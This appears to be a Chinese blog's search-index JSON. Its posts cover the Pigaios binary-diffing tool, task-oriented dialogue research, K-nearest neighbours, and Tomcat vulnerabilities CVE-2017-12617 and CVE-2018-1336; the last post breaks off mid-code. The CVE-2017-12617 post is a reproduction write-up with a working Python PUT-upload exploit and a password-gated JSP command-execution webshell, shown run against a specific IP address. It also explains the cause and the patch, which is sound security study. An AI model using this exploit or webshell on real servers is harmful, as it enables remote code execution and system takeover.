{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"一些友链","text":"小伙伴们的博客#站名链接分类Mote’s Bloghttp://m0te.top/webYuriSechttps://yurisec.cn/pwnMad‘s Bloghttps://nullpointer.me/web","link":"/friendlink/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"2020.08.12 迪士尼的天很蓝，城堡很美","text":"请输入密码查看.若无反应.请使用firefox浏览器 a21f83297447d6ab9da6f7f28fe551378ea7bcf93aaec43acf85d911df2ac98f0f46224360d665074768f25eb5e63e461da62eccd0c703f8b498fd15d8539657265a33f7e6c1a9a1d472d153d4d02fd52883461b44ce5f54b40504aa6e879755d167b8369f9535d5305d5df386d0c86d0f44128a434104f35f5c1e629eafb1805d6fb91a2ee7c79d7a2b2a7068864ecc991e04fca31836721334c3a4d64e96e1df76521b0079e58473db7ab7ba07ec417d8c292f5d70f835d0326efe0aa99531","link":"/62acab4f.html"},{"title":"2020.04.04 哀悼为抗击疫情斗争牺牲的烈士和逝世同胞","text":"哀悼！","link":"/55e3f1f2.html"},{"title":"源码二进制比对工具Pigaios","text":"Pigaios原理简介#目的： 为了解决符号表问题两种方案：编译源码，使用 Diaphora (or BinDiff) 导出符号表，导入符号表缺失样本从源码题符号表，导入符号表缺失样本第二种方法好处在于不需要完全编译，因为对于旧的源码，有的很难编译成功工作流程#解析源代码，并从每个函数的抽象语法树（AST）中提取信息。IDA导入从源代码提取的包含源码信息的数据库。查找在C源代码和IDA数据库中找到的函数匹配。找到没有误报的初始匹配项后，从调用图中找到更多匹配项。使用“专家系统”和“基于机器学习”的系统进行评分。同样，将给定代码库的所有结构和枚举导入IDA数据库（这在IDA中并不简单）。解析函数#二进制：通过IDA源码：通过CLang，提取字符串常量循环次数、条件判断、函数调用、全局变量switch信息函数调用信息是否为递归函数特征匹配#常规方法#完全匹配#首先是百分百匹配：为了达到零误报的目的作者实验结果为在4817个函数中找到了90完全匹配，虽然数目少，但胜在百分百确认，没有误报，不会对分析造成误导。启发式方法#为了找到更多的匹配，就需要一些启发式信息了启发式：调用图临近函数特殊的callee少见的常量特征机器学习方法#多分类，使用以下算法综合考量#当常规算法和ML结果都表现很好时，就说明匹配度very very good，两者可相互印证Pigaios使用指北#Pigaios是一款源码二进制比对工具，在实际二进制样本分析中，带符号表的样本极其少见，这个时候工具的作用就显现出来了。安装#在提取源码特征的机器（例如ubuntu）上安装依赖如下：1$ apt-get install clang python-clang-5.0 libclang-5.0-dev python-colorama python-sklearn在装有IDA的机子上也同时安装以下：1$ pip install clang-5 colorama scikit-learn源码特征提取过程#下以https://zlib.net/zlib-1.2.11.tar.gz为例生成项目信息文件#在源码根目录下1$ python /path/to/pigaios/srcbindiff.py -create默认生成文件sbd.project，内容为CXX，LLVM等配置信息，以及源码信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162##################################################### Default Source-Binary-Differ project configuration####################################################[GENERAL]includes = /usr/lib/llvm-3.8/bin/../lib/clang/3.8.0/includeinlines = 0[PROJECT]cflags = -I. -I./includecxxflags = -I. -I./includeexport-file = zlib-1.2.11.sqliteexport-header = zlib-1.2.11-exported.hexport-indent = clang-format -i[FILES]contrib/masmx64/inffas8664.c = 1contrib/iostream/test.cpp = 1contrib/iostream/zfstream.cpp = 1contrib/testzlib/testzlib.c = 1contrib/minizip/minizip.c = 1contrib/minizip/ioapi.c = 1contrib/minizip/iowin32.c = 1contrib/minizip/zip.c = 1contrib/minizip/miniunz.c = 1contrib/minizip/mztools.c = 1contrib/minizip/unzip.c = 1contrib/iostream2/zstream_test.cpp = 1contrib/inflate86/inffas86.c = 1contrib/infback9/infback9.c = 1contrib/infback9/inftree9.c = 1contrib/puff/pufftest.c = 1contrib/puff/puff.c = 1contrib/untgz/untgz.c = 1contrib/blast/blast.c = 1contrib/iostream3/test.cc = 1contrib/iostream3/zfstream.cc = 1examples/gzappend.c = 1examples/gun.c = 1examples/zpipe.c = 1examples/gzjoin.c = 1examples/fitblk.c = 1examples/zran.c = 1examples/gzlog.c = 1examples/enough.c = 1test/minigzip.c = 1test/infcover.c = 1test/example.c = 1inftrees.c = 1gzlib.c = 1inflate.c = 1adler32.c = 1gzclose.c = 1deflate.c = 1infback.c = 1crc32.c = 1zutil.c = 1inffast.c = 1trees.c = 1uncompr.c = 1gzread.c = 1compress.c = 1gzwrite.c = 1由于实际上example、test等目录包含的是测试样例，可以选择去除对这些文件的分析提取源码特征#1$ python /path/to/pigaios/srcbindiff.py -export结果存储在.sqlite文件中，在处理过程中会有库文件缺失，以及一些其他的error和fetal，但是没关系，Pigaios都会处理可以简要查看一下存了哪些信息，如下：包括调用图信息，常量信息，函数信息，源文件信息调用图信息常量信息都是字符串常量函数信息巨长，这里以tsv格式给出第94行和第127行两条记录，具体字段如下，提取了条件信息，switchcase信息，调用信息等1294 44176 inflate __int64 __fastcall() 289 21 [&quot;invalid block type&quot;, &quot;incorrect data check&quot;, &quot;too many length or distance symbols&quot;, &quot;invalid stored block lengths&quot;, &quot;invalid literal/length code&quot;, &quot;unknown compression method&quot;, &quot;incorrect header check&quot;, &quot;header crc mismatch&quot;, &quot;invalid distances set&quot;, &quot;invalid code lengths set&quot;, 595056260442243601, &quot;(I&quot;, &quot;unknown header flags set&quot;, &quot;invalid window size&quot;, &quot;invalid distance too far back&quot;, &quot;invalid distance code&quot;, &quot;incorrect length check&quot;, &quot;invalid literal/lengths set&quot;, &quot;invalid bit length repeat&quot;, &quot;invalid code -- missing end-of-block&quot;, &quot;`\\u0007&quot;] 1 1 [[31, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]]] 6 22 {&quot;.crc32&quot;: 12, &quot;.adler32&quot;: 4, &quot;inflate_table&quot;: 3, &quot;.memcpy&quot;: 5, &quot;.__stack_chk_fail&quot;: 1, &quot;inflate_fast&quot;: 1} 1 1 0 [&quot;incorrect&quot;, &quot;header&quot;]127 69776 gz_open __int64 __fastcall(char *file, int fd) __int64 __fastcall gz_open(char *file, int fd) 21 4 [18446744073709027328, 524481, &quot;%s&quot;, 524353] 1 1 [[78, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77]]] 6 2 {&quot;.open&quot;: 1, &quot;.lseek64&quot;: 2, &quot;.malloc&quot;: 2, &quot;.snprintf&quot;: 1, &quot;.strlen&quot;: 1, &quot;.free&quot;: 3} 1 0 0源文件信息不知道为啥是空的源码二进制比对#打开编译好并stripped掉的libz.so.1.2.11，运行pigiaos脚本sourceimp_ids.py可能因为IDA版本原因，需要在Indent command中去掉-kr选项，匹配结果如下Diff pseudo-code是将二进制函数反编译并和源码比较，由于颜色原因看不清，可能是因为我的IDA用了黑色主题。左侧为二进制函数F5结果，右侧为源码函数。show match reason显示匹配原因import all functions不是很好用，有错误导入不进来，应该是IDA版本原因注意#值得一提的是，从效果来看，strip对匹配结果影响很大，当未stripped时，可以获得31条匹配结果而当stripped时，只有18个匹配结果但前面也提到，Pigaios的主要目的是低误报率，避免误导分析人员，所以也是一个不错的工具参考#Pigaios源码","link":"/dc413e13.html"},{"title":"面向任务的对话系统","text":"​ 在对话系统领域中，面向任务的对话系统是其中很重要的一个分支，不同于开放域的对话系统，任务型对话系统侧重于完成一个领域或者几个领域内的特定任务，例如天气查询、餐厅预订等。面向任务的对话系统能够分为pipeline方法和end-to-end方法两类，并依赖相关领域内的知识库。本文首先介绍pipeline和end-to-end两类方法，然后简单介绍在面向任务的对话系统研究中使用的数据集，最后结合近三年中面向任务的对话系统领域内的研究成果，梳理当前存在的主要挑战。pipeline的方法#​ 图1.1所示为基于pipeline的面向任务的对话系统结构，它由自然语言理解（NLU）、对话状态跟踪（DST）、对话策略学习和自然语言生成（NLG）这四个关键部分组成：​ (1) 自然语言理解：将用户的自然输入，生成预定义的语义槽。​ (2) 对话状态跟踪：管理每个回合的对话输入和之前的对话历史，并输出当前的对话状态。​ (3) 对话策略：根据当前的对话状态学习下一个动作。​ (4) 自然语言生成：根据对话策略生成的动作，将其映射到自然语言，生成对话系统的响应。图1.1 基于pipeline的面向任务的对话系统结构[1]end-to-end的方法#​ 传统的面向任务的对话系统需要许多领域内的人工干预（例如手工编写规则、提取特征），这导致在一个领域中表现很好的方法在另一个领域中应用时不容易快速适应。对于pipeline的方法，主要存在两个问题：第一个问题是是信用分配问题(credit assignment problem)，最终用户的反馈很难传播到每个上游模块。第二个问题是组件之间的相互依赖。一个组件的输入取决于另一个组件的输出。当一个组件适应新环境或用新数据重新训练时，所有其他组件都需要相应地调整，以确保全局优化。​ 与pipeline的方法不同，end-to-end的方法使用单个模块并与结构化的外部知识库进行交互，目前使用的方法有基于神经网络、强化学习等。常用数据集#图3.1 面向任务的对话系统数据集[1]由于在面向任务的对话系统构建中需要不同领域内的知识和数据，因此研究员也收集了形成了不同的语料库（图3.1）。DSTC：提供了第一个用于对话状态跟踪的通用测试平台和评估套件。DSTC2: 在对话状态跟踪任务中引入了一些其他功能。对话状态也使用更加丰富的表示形式，包括用户目标的slot-value属性等，在交互过程中，存在一个匹配实体的数据库。bAbI：设计用于五个面向任务的对话任务。这些任务以基础知识库为基础，涵盖多个对话阶段，并评估模型的功能，包括对话管理、知识库查询等。CamRest：应用了WOZ范式，是测试一个回合，数据相对干净MTB：通过Amazon Mechanical Turk收集并由专家注释，常用于强化学习方法评估KVRET：内容包含车内助理的三个领域(日历调度、天气检索和导航)，对话通过知识库建立，因此十分适合构建能够使用知识进行推理的模型Frames：为了研究面向任务的对话系统的存储能力以及如何向用户提供知识库信息而开发的。M2M：通过框架收集，能够快速引导任意领域中的end-to-end对话。进通过提供任务模式和API客户端即可支持特定任务的对话。Air Dialog：定义了一个目标驱动的对话，以一对上下文为条件，最终达到目标状态，它支持三个对话任务：对话生成、状态跟踪和对话重现。MultiWOZ：是一个跨七个领域的大型语料库，每个对话都由一系列对话状态和系统动作进行注释。CoSQL：用于构建通用的知识库查询对话系统，每个对话都模拟了实际的知识库查询场景。MultiDoGo：是一个大型对话数据集，带有意图类型和slot标签。SGD：研究了模式指导的方法，能够轻松集成新的服务和API。CrossWOZ：第一个面向任务的中文数据集，着重于跨领域的用户目标。数据集包含了丰富的对话状态及用户和系统对话行为标签，以及用户模拟器和几个基准模型。近期研究和存在挑战#​ 从对pipeline的方法和end-to-end的方法介绍中可以看到，在面向任务对话系统中，存在的问题主要有以下三个[1]：​ (1) 数据有效性问题：特定领域内数据的收集和整理需要耗费大量的人力和时间，因此需要提高已搜集领域数据的有效性。​ (2) 多轮对话策略问题：在多轮对话中，对话策略强调目标导向，在每一轮中的系统动作应该和之前的对话保持一致，因此通过对多轮对话策略的研究，能够有效提提升多轮对话中对话系统的性能。​ (3) 知识库整合问题：任务型对话系统通过查询知识库检索实体生成响应，在pipeline的方法中，查询根据对话状态跟踪模块的结果进行构造，而在end-to-end的方法中，如何有效整合知识库内容进行应答是一个问题。以下根据上述三大挑战，对近三年来面向任务的对话系统的主要研究进行梳理。对数据有效性问题的研究#​ 近几年的研究工作在数据有效性问题上，都选择先找出不同领域间共有的数据进行较为通用的学习，并在迁移到新领域内时进行领域内特有数据的学习，从而提高已有数据的在其他领域内的有效性。图4.1 DF-Net实验结果[3]​ 在对数据有效性问题的研究中，Henderson M等人[2]受预训练模型的启发，将预训练应用于任务型对话系统中，首先在大量通用的语料库上进行对话系统的预训练，然后在移植到特定领域内进行训练时，只需要加入相对少量的特定领域内数据对预训练模型进行调优即可，结果表明在面向任务的对话系统中，这样的预训练十分有效。同样是为了提高数据的有效性，Qin L等人[3]将领域内知识分为领域间共有的知识和领域内特有的知识两类，在端到端的对话系统中提出了shared-private框架显式的学习领域间共有的知识和领域内特有的知识，并提出了一种动态融合网络(Dynamic Fusion Network)动态探索目标领域和各个领域之间知识的相关性，其在SMD和Multi-MOZ数据集上的测试结果也表明论文的模型存在较好的可迁移性并优于Mem2Seq等模型（图4.1）。图4.2 Huang X等人提出的MALA方法实验结果[3]​ Huang X等人[4]提出了MALA方法，其想法与Qin L等人[3]存在一定的共通之处，但是是区分领域间共有隐藏动作和领域内特有的隐藏动作。在任务导向的对话系统中需要提取用户的需求，之前的方法是将其分为对话规划和外部实现两部分。对话规划找到能够完成用户需求的动作，而外部实现将动作转换为对话响应。因此一些论文通过VAE(Variational AutoEncoder)获取隐藏的动作表示。由于学习隐藏动作需要对对话状态进行标注，而很多领域并不存在这样的数据集，因此Huang X等人希望在状态标注层面提高数据的有效性。例如在预定酒店和预定景点都存在询问价格的对话状态，这就是不同领域间共有的对话状态标注。共有的内容在领域间可以通用，而在应用于其他领域时，只需要学习领域内特有的对话状态即可。实验结果表明，这样的方法也能显著提高数据跨领域的有效性（图4.2）。对多轮对话策略的研究#​ 在多轮对话时，对话管理模块不仅需要处理当前对话，也要处理之前的历史对话，因此对于对话策略的研究能够在多轮对话中提高对话系统的性能。​ Lei W等人[5]提出了Sequicity模型(图4.3)，将面向任务的地话系统中的状态跟踪和文本生成通过sequence-to-sequence完成，并提出了Two Stage CopyNet模型，减少了计算的复杂度。实验表明，该方法在大规模预料库中优于baseline并且能够较好的处理OOV(Out of Vocabulary)问题(图4.4)。图4.3 Lei W提出的Sequicity模型[5]​ 整体流程如下，左侧为示例对话，右侧为Sequicity模型工作过程：​ (1) 第一步: 根据上一轮对话的belief span，上一轮对话的response和本轮的对话内容，生成本轮对话的belief span。​ (2) 第二步：在生成response时，根据上一轮对话的belief span，上一轮对话的response和本轮的对话内容，本轮的belief span和知识库获得本轮的response。图4.4 Sequicity模型OOV测试结果[5]​ 为了更好的处理全局的对话信息，Zhang Z等人[6]提出了记忆型增强型对话管理模型(MAD)，引入了记忆控制模块和两个记忆网络，分别处理对话状态中与语义槽值相关的信息和对话逻辑信息。同时，引入了基于槽值的Attention机制，使得不同槽值的状态能够更加集中于槽相关的信息，实验表明，该模型能够有效提升对话管理的性能。如图4.5所示，在第t轮对话中，模型图4.5 Zhang Z等人提出的记忆力增强型对话管理模型[6]​ 将当前的用户输入和之前的系统响应作为输入，对下一个对话行为进行预测。Slot-value momery的值根据用户输入的Attention进行更新，而External Memory由Memory控制器进行读取和更新。最后分类器根据Memory控制器和两个Memory的输出预测系统在t时刻的对话行为。实验结果表明，MAD方法在DSTC等数据集上都取得了不俗的表现(图4.6)。图4.6 MAD方法实验结果[6]对知识库整合问题的研究#在end-to-end的方法中，如何有效的利用知识库的知识整合到模型中是一个问题，在之前的RNN编解码器模型和结合Attention机制的RNN编解码器模型中，都存在以下问题：(1) 希望将外部知识库整合进RNN隐藏层中，但RNN处理长序列不稳定；(2) 处理长序列十分耗时，尤其是在加入了Attention机制的情况下。为了解决这一问题，Madotto A等人[7]在MemNNs的基础上提出了Mem2Seq模型，并使用multi-hop attention机制和pointer network。其优点有：(1)能够有效的融入知识库信息;(2)能学习如何生成动态查询来控制内存访问;(3)训练速度更快并在bAbI、DSTC、In-Car数据集上的表现优于之前的模型（图4.7）。图4.7 Mem2Seq模型实验结果[7]但是Mem2Seq等方法中的Memory机制也存在两个问题：(1)使用三元组表示知识使得Memory很难推理相关属性之间的关系(2)将对话上下文和知识库组合为同一Memory的一部分,使得Memory需要区分数据来自于知识库还是对话上下文，加大了推理的难度。为了解决这些问题，Reddy R等人[8]提出了多层的Memory结构模型。使用单独的Memory分别存储上下文和知识库的内容，为每种数据学习单独的Memory读取器。抛弃了之前的三元组知识表示形式，使用多层Memory结构，在每一层存储query、results和values，在自然层上对知识库结果进行编码。其在InCar、CamRest、Maluuba Frames数据集上的表现都优于Mem2Seq等baseline（图4.8）。图4.8 Multi-Level Memory模型实验结果[8]​ 现有的知识库往往十分庞大，因此很难完全融入到学习模型中，为了解决这一问题，Wu C S等人[9]提出了GLMP模型，通过全局Memory编码和本地Memory解码共享外部知识。首先由全局Memory编码器编码对话上下文，将结果写入外部知识库，并生成全局Memory指针，然后在解码阶段，本地Memory解码器首先生成简略回答，然后将其传入外部知识库进行筛选和查询，最后将返回的结果生成最终的回答。该方法在bAbI-OOV模型上实现了92%的准确度，超过Mem2Seq 7.5%（图4.9），并在SMD数据集上，也超过了baseline。图 4.9 GLMP模型在bAbI数据集上的表现[9]## 总结​ 从对近年面向任务的对话系统研究的梳理和回顾中可以发现：​ (1)在对数据的有效性问题的研究中，如何提高已有数据在新领域中有效性，减少人工构造新领域的数据量是一个热点和挑战。目前通用对话预训练结合新领域少量数据调优是主要的方法，在扩展到新领域时，结合领域间共有的隐式知识取得了比较好的效果。​ (2)在对多轮对话管理问题的研究中，则主要研究如何在多轮对话中，更好的结合历史对话内容，提高全局的对话系统性能。​ (3)在end-to-end的方法中对结合知识库问答问题的研究中，目前的研究主要还是在MemNNs的基础上对Memory机制进行改进，通过各种方法结合知识库知识和对话上下文给出更好的对话回答。总体来说，面向任务的对话系统的研究仍有较长的路要走，我相信终有一天面向任务的对话系统能够完全代替人类进行任务型对话。参考文献#[1] Zheng Zhang, Ryuichi Takanobu, Minlie Huang, Xiaoyan Zhu. Recent Advances and Challenges in Task-oriented Dialog System . arXiv preprint arXiv:2003.07490. 2020[2] Henderson M, Vulić I, Gerz D, et al. Training neural response selection for task-oriented dialogue systems[J]. arXiv preprint arXiv:1906.01543, 2019.[3] Qin L, Xu X, Che W, et al. Dynamic Fusion Network for Multi-Domain End-to-end Task-Oriented Dialog[J]. arXiv preprint arXiv:2004.11019, 2020.[4] Huang X, Qi J, Sun Y, et al. MALA: Cross-Domain Dialogue Generation with Action Learning[J]. arXiv preprint arXiv:1912.08442, 2019.[5] Lei W, Jin X, Kan M Y, et al. Sequicity: Simplifying task-oriented dialogue systems with single sequence-to-sequence architectures[C]//Proceedings of the 56th Annual Meeting of the Association for Computational Linguistics (Volume 1: Long Papers). 2018: 1437-1447.[6] Zhang Z, Huang M, Zhao Z, et al. Memory-augmented dialogue management for task-oriented dialogue systems[J]. ACM Transactions on Information Systems (TOIS), 2019, 37(3): 1-30.[7] Madotto A, Wu C S, Fung P. Mem2seq: Effectively incorporating knowledge bases into end-to-end task-oriented dialog systems[J]. arXiv preprint arXiv:1804.08217, 2018.[8] Reddy R, Contractor D, Raghu D, et al. Multi-Level Memory for Task Oriented Dialogs[J]. arXiv preprint arXiv:1810.10647, 2018.[9] Wu C S, Socher R, Xiong C. Global-to-local memory pointer networks for task-oriented dialogue[J]. arXiv preprint arXiv:1901.04713, 2019.","link":"/599bbf87.html"},{"title":"机器学习1——K近邻算法","text":"K近邻算法：一种基本的分类算法基本内容#输入：实例的特征向量输出：实例的类别思想：近朱者赤近墨者黑，对于输入实例x，选取距离x最近的K个点，x的分类结果就是K个点中数目最多的那个类别三个要素：K的选择距离的度量分类决策规则优点：精度高、异常值不敏感、无数据输入假定缺点：计算复杂度高、空间复杂度高适用数据范围：数值型、标称型开发流程#收集数据：任何方法准备数据：距离计算所需要的数值，最好是结构化的数据格式分析数据：任何方法训练算法：此步骤不适用于 k-近邻算法测试算法：计算错误率使用算法：输入样本数据和结构化的输出结果，然后运行 k-近邻算法判断输入数据分类属于哪个分类，最后对计算出的分类执行后续处理实战项目#约会网站https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md手写数字识别https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md注意点在于使用数据前一定要对数据进行归一化，否则数据范围差距过大，会引起很大问题归一化的方法#线性函数转换：$y=(x-MinValue)/(MaxValue-MinValue) $对数函数转换：$y=lg(x) $ 是非线性转换，对x的取值范围有要求反余切函数转换：$y=arctan(x)*2/PI $，非线性转换，且对x的范围没有要求三要素#K的取值#K小时，近似误差小，估计误差大；K大时，近似误差大，估计误差小K小时，相当于用较小邻域中的训练实例进行预测，学习的近似误差会小，只有与输入实例相近的训练集样本才会对结果又影响。但缺点是学习误差会增大，如果恰好有噪声，则可能会出错。因此，K减小容易发生过拟合K大时，与上面相反可以使用交叉验证选取合适的K值PS:近似误差：可以理解为对现有训练集的训练误差。估计误差：可以理解为对测试集的测试误差。距离度量#通常是用欧氏距离，也可以是曼哈顿距离等分类决策#少数服从多数核心算法#暴力计算（Brute Force）二叉树平分参数空间（KD Tree）超球体平分训练数据 (Ball Tree)具体可以看sklean文档 https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md123clf = neighbors.KNeighborsClassifier(k, weights='uniform') # weights选用uniform是所有维度数据权重一致clf.fit(trainingMat, trainLabels)pridects = clf.predict(testMat)","link":"/437066e7.html"},{"title":"CVE-2017-12617","text":"基本信息#When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.影响范围：7.0.0 - 7.0.818.0.0.RC1 - 8.0.468.5.0 - 8.5.229.0.0.M1 - 9.0.0描述：当在Tomcat的web.xml配置文件中设置readonly为false时，攻击者可以通过PUT请求能够上传任意文件，当上传恶意的jsp文件时，就可以通过jsp的webshell文件获得shell漏洞复现#环境配置#Step1 ：http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gzStep 2：修改配置文件，增加readonly = false1234567891011121314151617 &lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt;+ &lt;init-param&gt;+ &lt;param-name&gt;readonly&lt;/param-name&gt;+ &lt;param-value&gt;false&lt;/param-value&gt;+ &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt;攻击#Step1 ：构造PUT请求验证漏洞是否存在请求如下：123456789101112131415def verify(url,port): vul_url = url+&quot;:&quot;+port print(&quot;target:&quot;,vul_url) poc_path = urlparse.urljoin(vul_url,&quot;test.txt&quot;) print(poc_path) payload = &quot;This is Vulnerable CVE-2017-12617!&quot; poc_req = requests.put(url = poc_path,data = payload, verify = False) poc_content = requests.get(url = poc_path,verify = False).content if(&quot;CVE-2017-12617&quot; in poc_content): print(&quot;CVE-2017-12617 exsits in this target!&quot;) else: print(&quot;No CVE-2017-12617 in this target!&quot;)结果：1234# python CVE-2017-12617.py -u http://47.100.18.67 -p 8080 --choice verify('target:', 'http://47.100.18.67:8080')http://47.100.18.67:8080/test.txtCVE-2017-12617 exsits in this target!同时可以看到在根目录下出现了test.txt文件Step2： 上传恶意jsp文件1234567891011121314151617181920212223242526272829def attack(url,port): payload = &quot;&quot;&quot;&lt;% if(&quot;password&quot;.equals(request.getParameter(&quot;pwd&quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); }%&gt;&quot;&quot;&quot; vul_url = url+&quot;:&quot;+port print(&quot;target:&quot;,vul_url) #由于本身不允许直接上传jsp文件，但可能可以通过构造绕过 #参考:https://www.cnblogs.com/leixiao-/p/10264236.html poc_path = urlparse.urljoin(vul_url,&quot;poc.jsp/&quot;) print(poc_path) poc_req = requests.put(url = poc_path,data = payload, verify = False) print(poc_req.status_code) poc_content = requests.get(url = urlparse.urljoin(vul_url,&quot;poc.jsp&quot;)+&quot;?pwd=password&amp;i=whoami&quot;,verify = False).content if(poc_content==&quot;&quot;): print(&quot;Attack failed!&quot;) else: # print(&quot;whoami result:&quot;,poc_content) print(&quot;Attack success!&quot;)1234# python CVE-2017-12617.py -u http://47.100.18.67 -p 8080 --choice attack('target:', 'http://47.100.18.67:8080')http://47.100.18.67:8080/poc.jsp/Attack success!http://47.100.18.67:8080/poc.jsp?pwd=password&amp;i=ls原理#./conf/web.xml从配置文件可以看到，.jsp和.jspx后缀会交给org.apache.jasper.servlet.JspServlet类进行处理，其余交给org.apache.catalina.servlets.DefaultServlet类处理12345678910111213141516104 &lt;servlet-name&gt;default&lt;/servlet-name&gt;105 &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;...251 &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;252 &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;...382 &lt;servlet-mapping&gt;383 &lt;servlet-name&gt;default&lt;/servlet-name&gt;384 &lt;url-pattern&gt;/&lt;/url-pattern&gt;385 &lt;/servlet-mapping&gt;...388 &lt;servlet-mapping&gt;389 &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;390 &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;391 &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;392 &lt;/servlet-mapping&gt;DefaultServlet#./java/org/apache/catalina/servlets/DefaultServlet.java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { // 检查readOnly if (readOnly) { resp.sendError(HttpServletResponse.SC_FORBIDDEN); return; } String path = getRelativePath(req); // 判断文件是否已经存在 boolean exists = true; try { resources.lookup(path); } catch (NamingException e) { exists = false; } boolean result = true; // Temp. content file used to support partial PUT File contentFile = null; Range range = parseContentRange(req, resp); InputStream resourceInputStream = null; // Append data specified in ranges to existing content for this // resource - create a temp. file on the local filesystem to // perform this operation // Assume just one range is specified for now // 得到put请求的内容 if (range != null) { contentFile = executePartialPut(req, range, path); resourceInputStream = new FileInputStream(contentFile); } else { resourceInputStream = req.getInputStream(); } try { // 将内容输出到文件中 Resource newResource = new Resource(resourceInputStream); // FIXME: Add attributes if (exists) { resources.rebind(path, newResource); } else { resources.bind(path, newResource); } } catch(NamingException e) { result = false; } if (result) { if (exists) { resp.setStatus(HttpServletResponse.SC_NO_CONTENT); } else { resp.setStatus(HttpServletResponse.SC_CREATED); } } else { resp.sendError(HttpServletResponse.SC_CONFLICT); }}判断readOnly是否开启判断文件是否已存在将PUT请求内容输出到文件利用方法#由于Tomcat本身不允许上传jsp文件，因此选择使用DefaultServlet创建jsp文件利用操作系统的特性：Windows不会识别空格为文件名后缀Linux不会识别/为文件名后缀因此上传时设置文件名为jsp%20或者jsp/，让Tomcat使用DefaultServlet创建文件，由于系统特性，最后生成的文件为jsp文件，攻击者访问即可get shell防护方法#不启用readonly设置在DefaultServlet中加入对/以及%20的判断patch链接：https://github.com/apache/tomcat/commit/b7e0435d17aba69f16ae9e8a78ad0f1565b552afhttps://github.com/apache/tomcat/commit/b577f9a7996b92b650b1649af3c3bae11c120db9参考资料#CVE-2017-12617-Tomcat远程代码执行漏洞复现测试CVE-2017-12617 EXP","link":"/e50797f2.html"},{"title":"CVE-2018-1336和CVE-2018-8034","text":"CVE-2018-1336#An improper handing of overflow in the UTF-8 decoder with supplementary characters can lead to an infinite loop in the decoder causing a Denial of Service. Versions Affected: Apache Tomcat 9.0.0.M9 to 9.0.7, 8.5.0 to 8.5.30, 8.0.0.RC1 to 8.0.51, and 7.0.28 to 7.0.86.漏洞原理#从补丁中可以看到问题出在函数decodeHasArray中1234567891011121314--- a/java/org/apache/tomcat/util/buf/Utf8Decoder.java+++ b/java/org/apache/tomcat/util/buf/Utf8Decoder.java@@ -278,6 +278,11 @@ public class Utf8Decoder extends CharsetDecoder { outRemaining--; } else { if (outRemaining &lt; 2) {+ // Encoded with 4 bytes. inIndex currently points+ // to the final byte. Move it back to first byte.+ inIndex -= 3;+ in.position(inIndex - in.arrayOffset());+ out.position(outIndex - out.arrayOffset()); return CoderResult.OVERFLOW; } cArr[outIndex++] = (char) ((jchar &gt;&gt; 0xA) + 0xD7C0);由于UTF8是可边长的编码方式，因此需要逐字节的判断是否符合UTF8标准，以及该编码的长度是几个字节对于一个ByteBuffer类型，以下是我们需要关注的属性position：当前的下标位置，表示进行下一个读写操作时的起始位置limit：结束标记下标，表示进行下一个读写操作时的（最大）结束位置capacity：该ByteBuffer容量remaining;该ByteBuffer当前的剩余可用长度为了防止缓冲区溢出，在decodeHasArray函数中对UTF8解码时，需要一直关注以上4个属性，尤其是解码后存放结果的Buffer的remaining属性123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146private CoderResult decodeHasArray(ByteBuffer in, CharBuffer out) { int outRemaining = out.remaining(); int pos = in.position(); int limit = in.limit(); final byte[] bArr = in.array(); final char[] cArr = out.array(); final int inIndexLimit = limit + in.arrayOffset(); int inIndex = pos + in.arrayOffset(); int outIndex = out.position() + out.arrayOffset(); // if someone would change the limit in process, // he would face consequences for (; inIndex &lt; 